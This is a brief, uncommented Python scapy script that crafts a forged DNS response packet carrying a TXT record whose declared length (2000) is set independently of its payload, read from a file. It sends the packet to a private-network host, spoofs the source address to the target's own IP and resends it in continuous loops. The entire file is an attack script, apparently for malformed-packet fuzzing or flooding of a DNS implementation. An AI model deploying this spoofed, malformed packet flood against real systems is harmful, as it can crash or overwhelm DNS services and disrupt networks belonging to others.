# -*- coding: utf-8 -*-
from scapy.all import *

destip='192.168.1.3'
domain_name='192.168.1.1'
rd2='192.168.1.2'

f=open('rdata.txt')
resdata=f.read()
f.close()

pkt=IP(dst=destip)/UDP(sport=60022)/DNS(qr=1, cd=1, ad=1,qd=DNSQR(), an=DNSRR(rdlen=2000,rdata=resdata,type=16), ns=DNSRR(type=16))
result=sr1(pkt)
source='192.168.1.3' 
pkt[IP].src=source
srloop(pkt)
srloop(pkt,inter=0.1)

